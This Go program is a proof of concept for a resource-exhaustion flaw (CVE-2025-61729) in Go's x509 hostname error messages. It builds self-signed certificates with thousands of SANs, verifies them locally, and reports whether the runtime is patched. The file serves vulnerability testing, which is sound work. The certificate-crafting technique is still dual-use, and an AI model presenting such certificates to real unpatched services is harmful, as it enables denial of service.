// CVE-2025-61729 Proof of Concept
//
// This POC demonstrates the resource consumption vulnerability in
// crypto/x509.HostnameError.Error() method.
//
// Vulnerability: HostnameError.Error() uses O(N²) string concatenation
// when building error messages for certificates with many SANs.
//
// A malicious certificate with thousands of SANs could cause:
// - Excessive CPU usage
// - Excessive memory allocation
// - Potential DoS
//
// Fixed in: Go 1.24.x, 1.25.x (with patch)
// - Uses strings.Builder instead of string concatenation
// - Limits output to 100 names

package main

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/pem"
	"fmt"
	"math/big"
	"net"
	"os"
	"runtime"
	"strconv"
	"time"
)

func main() {
	fmt.Println("===========================================")
	fmt.Println("CVE-2025-61729 Proof of Concept")
	fmt.Println("===========================================")
	fmt.Println()

	// Get number of SANs from environment or use default
	numSANs := 5000
	if envSANs := os.Getenv("NUM_SANS"); envSANs != "" {
		if n, err := strconv.Atoi(envSANs); err == nil {
			numSANs = n
		}
	}

	fmt.Printf("Go Version: %s\n", runtime.Version())
	fmt.Printf("Testing with %d SANs\n", numSANs)
	fmt.Println()

	// Test 1: DNS Names
	fmt.Println("--- Test 1: Certificate with many DNS SANs ---")
	testDNSSANs(numSANs)

	fmt.Println()

	// Test 2: IP Addresses
	fmt.Println("--- Test 2: Certificate with many IP SANs ---")
	testIPSANs(numSANs)

	fmt.Println()
	fmt.Println("===========================================")
	fmt.Println("POC Complete")
	fmt.Println("===========================================")
}

func testDNSSANs(count int) {
	// Generate certificate with many DNS SANs
	cert := generateCertWithDNSSANs(count)
	if cert == nil {
		fmt.Println("ERROR: Failed to generate certificate")
		return
	}

	fmt.Printf("Generated certificate with %d DNS names\n", len(cert.DNSNames))

	// Try to verify against a non-matching hostname
	opts := x509.VerifyOptions{
		DNSName: "www.target.com",
		Roots:   x509.NewCertPool(),
	}
	opts.Roots.AddCert(cert)

	// Measure time to call VerifyHostname (which triggers Error())
	var memBefore, memAfter runtime.MemStats
	runtime.GC()
	runtime.ReadMemStats(&memBefore)

	start := time.Now()

	// This will fail and call HostnameError.Error()
	_, err := cert.Verify(opts)
	if err != nil {
		// Force the error string to be generated
		errStr := err.Error()
		_ = errStr
	}

	elapsed := time.Since(start)

	runtime.ReadMemStats(&memAfter)

	fmt.Printf("Time elapsed: %v\n", elapsed)
	fmt.Printf("Memory allocated: %d bytes\n", memAfter.TotalAlloc-memBefore.TotalAlloc)

	// Check if the fix is applied (error message should be truncated)
	if err != nil {
		errStr := err.Error()
		if len(errStr) < 1000 {
			fmt.Printf("Error message length: %d (PATCHED - message truncated)\n", len(errStr))
			fmt.Println("RESULT: PATCHED ✓")
		} else {
			fmt.Printf("Error message length: %d (VULNERABLE - all SANs included)\n", len(errStr))
			fmt.Println("RESULT: VULNERABLE ✗")
		}
	}
}

func testIPSANs(count int) {
	// Generate certificate with many IP SANs
	cert := generateCertWithIPSANs(count)
	if cert == nil {
		fmt.Println("ERROR: Failed to generate certificate")
		return
	}

	fmt.Printf("Generated certificate with %d IP addresses\n", len(cert.IPAddresses))

	// Try to verify against a non-matching IP
	opts := x509.VerifyOptions{
		DNSName: "192.168.1.1", // IP as DNS name triggers IP SAN check
		Roots:   x509.NewCertPool(),
	}
	opts.Roots.AddCert(cert)

	// Measure time
	var memBefore, memAfter runtime.MemStats
	runtime.GC()
	runtime.ReadMemStats(&memBefore)

	start := time.Now()

	_, err := cert.Verify(opts)
	if err != nil {
		errStr := err.Error()
		_ = errStr
	}

	elapsed := time.Since(start)

	runtime.ReadMemStats(&memAfter)

	fmt.Printf("Time elapsed: %v\n", elapsed)
	fmt.Printf("Memory allocated: %d bytes\n", memAfter.TotalAlloc-memBefore.TotalAlloc)

	// Check if the fix is applied
	if err != nil {
		errStr := err.Error()
		if len(errStr) < 1000 {
			fmt.Printf("Error message length: %d (PATCHED - message truncated)\n", len(errStr))
			fmt.Println("RESULT: PATCHED ✓")
		} else {
			fmt.Printf("Error message length: %d (VULNERABLE - all IPs included)\n", len(errStr))
			fmt.Println("RESULT: VULNERABLE ✗")
		}
	}
}

func generateCertWithDNSSANs(count int) *x509.Certificate {
	// Generate a self-signed certificate with many DNS SANs
	privKey, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		fmt.Printf("Error generating key: %v\n", err)
		return nil
	}

	// Create DNS names
	dnsNames := make([]string, count)
	for i := 0; i < count; i++ {
		dnsNames[i] = fmt.Sprintf("host%d.example.com", i)
	}

	template := &x509.Certificate{
		SerialNumber: big.NewInt(1),
		Subject: pkix.Name{
			CommonName: "Test Certificate",
		},
		NotBefore:             time.Now(),
		NotAfter:              time.Now().Add(365 * 24 * time.Hour),
		KeyUsage:              x509.KeyUsageCertSign | x509.KeyUsageDigitalSignature,
		BasicConstraintsValid: true,
		IsCA:                  true,
		DNSNames:              dnsNames,
	}

	certDER, err := x509.CreateCertificate(rand.Reader, template, template, &privKey.PublicKey, privKey)
	if err != nil {
		fmt.Printf("Error creating certificate: %v\n", err)
		return nil
	}

	cert, err := x509.ParseCertificate(certDER)
	if err != nil {
		fmt.Printf("Error parsing certificate: %v\n", err)
		return nil
	}

	return cert
}

func generateCertWithIPSANs(count int) *x509.Certificate {
	// Generate a self-signed certificate with many IP SANs
	privKey, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		fmt.Printf("Error generating key: %v\n", err)
		return nil
	}

	// Create IP addresses
	ipAddresses := make([]net.IP, count)
	for i := 0; i < count; i++ {
		// Generate IPs in the format 10.x.y.z
		ipAddresses[i] = net.IPv4(10, byte((i/65536)%256), byte((i/256)%256), byte(i%256))
	}

	template := &x509.Certificate{
		SerialNumber: big.NewInt(1),
		Subject: pkix.Name{
			CommonName: "Test Certificate",
		},
		NotBefore:             time.Now(),
		NotAfter:              time.Now().Add(365 * 24 * time.Hour),
		KeyUsage:              x509.KeyUsageCertSign | x509.KeyUsageDigitalSignature,
		BasicConstraintsValid: true,
		IsCA:                  true,
		IPAddresses:           ipAddresses,
	}

	certDER, err := x509.CreateCertificate(rand.Reader, template, template, &privKey.PublicKey, privKey)
	if err != nil {
		fmt.Printf("Error creating certificate: %v\n", err)
		return nil
	}

	cert, err := x509.ParseCertificate(certDER)
	if err != nil {
		fmt.Printf("Error parsing certificate: %v\n", err)
		return nil
	}

	return cert
}

// For debugging: print certificate as PEM
func certToPEM(cert *x509.Certificate) string {
	return string(pem.EncodeToMemory(&pem.Block{
		Type:  "CERTIFICATE",
		Bytes: cert.Raw,
	}))
}
